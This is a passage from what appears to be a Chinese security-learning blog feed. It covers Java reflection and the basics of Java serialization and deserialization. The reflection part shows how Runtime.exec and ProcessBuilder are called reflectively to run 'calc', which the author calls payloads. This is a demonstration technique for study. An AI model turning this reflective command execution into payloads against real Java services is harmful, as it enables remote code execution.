<p><img src="/2024/06/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20240614170106503.png" alt="image-20240614170106503"></p>
<p>这种设计就是“单例模式”，这里可以使用一个静态方法来获取对象，所以在这里我们只能通过<code>Runtime.getRuntime()</code>来获取到<code>Runtime</code>对象。</p>
<p>这里Runtime.getRuntime()是一个静态方法，所以在使用invoke执行方法时，第一个参数需要传入一个Runtime类,所以可以将代码改成如下来执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//成功弹出计算机</span></span><br></pre></td></tr></table></figure>

<p>还可以通过<code>setAccessible(true)</code>获得访问权限，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ctf.getDeclaredConstructor();</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> ctf.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">x</span> <span class="operator">=</span> method1.invoke(o);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> ctf.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        method2.invoke(x,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后虽然弹出警告但是成功弹出计算机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by Text (file:/D:/java_text/java-1/out/production/java-1/) to constructor java.lang.Runtime()</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of Text</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br></pre></td></tr></table></figure>

<h3 id="利用ProcessBuilder"><a href="#利用ProcessBuilder" class="headerlink" title="利用ProcessBuilder"></a>利用<code>ProcessBuilder</code></h3><p><code>java.lang.ProcessBuilder</code>类用于创建操作系统进程， <code>ProcessBuilder</code> 有两个构造函数：</p>
<p><img src="/2024/06/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20240614210420811.png" alt="image-20240614210420811"></p>
<p><img src="/2024/06/19/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/image-20240614210432473.png" alt="image-20240614210432473"></p>
<p>利用第一种形式的构造函数，在<code>getConstructor</code>传入<code>List.class</code>，然后获取并调用<code>start</code>方法来执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ctf.getConstructor(List.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> ctf.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        method1.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*成功弹计算机</span></span><br><span class="line"><span class="comment">中间代码精炼一下就是（这样就不用导lang下的包）：</span></span><br><span class="line"><span class="comment">Class ctf = Class.forName(&quot;java.lang.ProcessBuilder&quot;);        ctf.getMethod(&quot;start&quot;).invoke(ctf.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc&quot;)));</span></span><br></pre></td></tr></table></figure>



<p>对于第二种形式的构造函数，这里就涉及到了Java中的可变长参数，当定义函数的时候不确定参数数量的时候，可以使用<code>...</code>这样的语法来表示”这个函数的参数个数是可变的“。同时对于可变长参数，Java在编译时会编译成一个数组，所有说下面这两种写法在底层其实是等价的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...name)</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。</p>
<p>我们将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>即可，此时就获取到了参数为数组类型的<code>newInstance()</code>，在调用<code>newInstance</code>的时候，因为本身接收的是一个可变长参数（即一个数组），并且需要我们传给 <code>ProcessBuilder</code>构造器的参数的是一个<code>List&lt;String&gt;</code>类型，二者叠加为一个二维数组,最终payload如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ctf</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> ctf.getConstructor(String[].class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor1.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> ctf.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        method1.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*中间代码精简：</span></span><br><span class="line"><span class="comment">Class ctf = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span></span><br><span class="line"><span class="comment">ctf.getMethod(&quot;start&quot;).invoke(ctf.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;&quot;calc&quot;&#125;&#125;));</span></span><br></pre></td></tr></table></figure>

<p>说一点点代码：</p>
<ul>
<li>对于<code>new String[][]&#123;&#123;"calc"&#125;&#125;</code>：这里使用 <code>new</code> 关键字创建并初始化一个二维字符串数组，确保参数类型正确匹配 。</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java基础</category>
        <category>Java反射机制</category>
      </categories>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>在分析反序列化调用链之前，需要有java反序列化的基本知识。</p>
<span id="more"></span>

<p>在Java中，序列化过程分为两大部分：序列化和反序列化。</p>
<ul>
<li><strong>序列化</strong>：将对象的状态转换为可存储或传输的格式的过程。例如，将对象转换为字节流或文本格式（如 JSON、XML 等）。这样可以将对象保存到文件、数据库或者通过网络传输。</li>
<li><strong>反序列化</strong>：将序列化后的数据恢复为对象的过程。也就是说，将字节流或文本格式的数据重新转换为内存中的对象。</li>
</ul>
<p>这两部分共同构成了序列化过程，确保对象可以被持久化存储或远程传输，并在需要时恢复原始的对象状态。</p>
<h3 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h3><p>在Java中实现对象反序列化非常简单，实现<code>java.io.Serializable（内部序列化）</code>或<code>java.io.Externalizable（外部序列化）</code><strong>接口</strong>即可被序列化。下面有几个点需要说明：</p>
<h4 id="Serializable-接口"><a href="#Serializable-接口" class="headerlink" title="Serializable 接口"></a>Serializable 接口</h4><p>源代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>一个对象想要被序列化，那么它的类就要实现此接口或者它的子接口。</strong></p>
<p>这个对象的所有属性（包括private属性和其引用的对象）都可以被序列化和反序列化来保存、传递。<strong>不想序列化的字段可以使用transient修饰</strong>。</p>
<p>由于 Serializable 对象完全以它存储的二进制位为基础来构造，因此并不会调用任何构造函数，因此Serializable类无需默认构造函数，但是当Serializable类的父类没有实现Serializable接口时，反序列化过程会调用父类的默认构造函数，因此该父类必需有默认构造函数，否则会抛异常。</p>
<p>使用transient关键字阻止序列化虽然简单方便，但被它修饰的属性被完全隔离在序列化机制之外，导致了在反序列化时无法获取该属性的值，而<strong>通过在需要序列化的对象的Java类里加入writeObject()方法与readObject()方法可以控制如何序列化各属性，甚至完全不序列化某些属性或者加密序列化某些属性。</strong></p>
<p>在这里还需要了解一个点，那就是<strong>static修饰的字段是绑定在类上的，而不是对象上</strong>。static优先于对象存在，所以static修饰的字段不会被序列化。</p>
<h4 id="Externalizable-接口"><a href="#Externalizable-接口" class="headerlink" title="Externalizable 接口"></a>Externalizable 接口</h4><p>对于这个接口的使用可以参考最后面的参考文章。</p>
<p>源代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Externalizable</span> <span class="keyword">extends</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它是Serializable接口的子类，这个接口里面定义了两个抽象的方法，用户需要重载writeExternal()和readExternal()方法，用来决定如何序列化和反序列化。</p>
<p>因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。</p>
<p>对Externalizable对象反序列化时，会先调用类的无参构造方法，这是有别于默认反序列方式的。如果把类的不带参数的构造方法删除，或者把该构造方法的访问权限设置为private、默认或protected级别，会抛出java.io.InvalidException: no valid constructor异常，因此Externalizable对象必须有默认构造函数，而且必需是public的。</p>
<h4 id="serialVersionUID字段"><a href="#serialVersionUID字段" class="headerlink" title="serialVersionUID字段"></a>serialVersionUID字段</h4><p>这个字段可以在序列化过程中控制序列化的版本。一般格式就是下面这个：</p>
<p><img src="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240628165137015.png" alt="image-20240628165137015"></p>
<p>一个对象数据，在反序列化过程中，如果序列化串中的serialVersionUID与当前对象值不同，则反序列化失败，会报错，否则成功。</p>
<p>如果serialVersionUID没有显式生成，系统就会自动生成一个。属性的变化都会导致自动生成的serialVersionUID发生变化。如果序列化和反序列化的serialVersionUID不同，则会报序列化版本不同的错误。</p>
<p><strong>如果我们保持了serialVersionUID的一致，则在反序列化时，对于新增的字段会填入默认值null（int的默认值0）,对于减少的字段则直接忽略。</strong></p>
<h3 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h3><p><img src="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240628173304667.png" alt="image-20240628173304667"></p>
<p>如上图，现在我们来了解一下ObjectInputStream和ObjectOutputStream。</p>
<h5 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h5><p>这个类与序列化相关</p>
<p>部分源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> <span class="keyword">implements</span> <span class="title class_">ObjectOutput</span>, ObjectStreamConstants</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>java.io.ObjectOutputStream</code>继承自 OutputStream 类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。</p>
<p>现在来看这个类的构造方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        verifySubclass();</span><br><span class="line">        bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br><span class="line">        handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">        subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">        enableOverride = <span class="literal">false</span>;</span><br><span class="line">        writeStreamHeader();</span><br><span class="line">        bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该构造方法接收一个 OutputStream 对象作为参数</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里会创建一个FileOutputStream流以写入数据到File对象所代表的文件</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br></pre></td></tr></table></figure>

<p>这里序列化想要利用就要用到<code>ObjectOutputStream</code>这个类的<code>writeObject</code>方法。</p>
<h5 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h5><p>这个类和反序列化相关，它可以读取 ObjectOutputStream 写入的字节流，并将其反序列化为相应的对象。</p>
<p>部分源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ObjectInputStream</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">InputStream</span> <span class="keyword">implements</span> <span class="title class_">ObjectInput</span>, ObjectStreamConstants</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>核心方法是readObject()，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> readObject(Object.class);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到返回的类型为Object。</p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>最终测试代码如下：</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;fupanc&quot;</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">char</span> <span class="variable">height</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> <span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">1111</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        p.setName(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        x.writeObject(p);</span><br><span class="line">        x.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功生成ser.ser文件，十六进制打开看一下，如下：</p>
<p><img src="/2024/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240702150339065.png" alt="image-20240702150339065"></p>
<p>可以看出这里只序列化了height和name，而sex和age并没有被序列化。所以在这里就可以知道正如前面说的，<strong>使用transient和static修饰的变量不会被序列化</strong>。</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反序列化对象时有如下限制：</p>
<ul>
<li>被反序列化的类必须存在。</li>
<li><code>serialVersionUID</code>值必须一致。</li>
</ul>
<p>同样使用上面的Test.java。这里就只给Main.java，反序列化代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        <span class="type">Test</span> <span class="variable">ctf</span> <span class="operator">=</span> (Test)p.readObject();<span class="comment">//这里由于返回类型不同，需要强制转换</span></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的name:&quot;</span>+ctf.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的sex:&quot;</span>+ctf.getSex());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的age:&quot;</span>+ctf.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化后的name:haha</span><br><span class="line">反序列化后的sex:null</span><br><span class="line">反序列化后的age:1111</span><br></pre></td></tr></table></figure>

<p>解读一下结果：</p>
<ul>
<li><strong>sex为null</strong>，就是因为我在Test类用transient修饰，所以在序列化时并不会将sex字段序列化，所以这里并没有值。</li>
<li><strong>age为1111</strong>，这就与static有关了，这是因为static为全局变量，在JVM中所有实例都会共享该字段。</li>
</ul>
<p>对比一下，刚好可以再说明一个点</p>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;fupanc&quot;</span> ;    <span class="comment">//这里添加static</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="string">&quot;boy&quot;</span>;    <span class="comment">//这里去除transient</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">1111</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Main.java  (省去序列化过程)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        <span class="type">Test</span> <span class="variable">ctf</span> <span class="operator">=</span> (Test)y.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的name:&quot;</span>+ctf.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的sex:&quot;</span>+ctf.getSex());</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的age:&quot;</span>+ctf.getAge());           </span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化后的name:fupanc</span><br><span class="line">反序列化后的sex:boy</span><br><span class="line">反序列化后的age:1111</span><br></pre></td></tr></table></figure>

<p>从这个结果可以更加说明static修饰的字段不会被序列化的特性，以及更加清楚了是否使用transient结果的不同。</p>
<p>但是在测试过程中，发现了一个问题，Main.java内容如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="type">Test</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">            p.setName(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">            x.writeObject(p);</span><br><span class="line">            x.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反序列化</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">            <span class="type">Test</span> <span class="variable">ctf</span> <span class="operator">=</span> (Test)y.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化后的name:&quot;</span>+ctf.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化后的sex:&quot;</span>+ctf.getSex());</span><br><span class="line">            System.out.println(<span class="string">&quot;反序列化后的age:&quot;</span>+ctf.getAge());</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化后的name:haha</span><br><span class="line">反序列化后的sex:boy</span><br><span class="line">反序列化后的age:1111</span><br></pre></td></tr></table></figure>

<p>注意这里的name的结果为haha，那么为什么会出现这样的结果呢？解答如下（个人理解）：</p>
<ul>
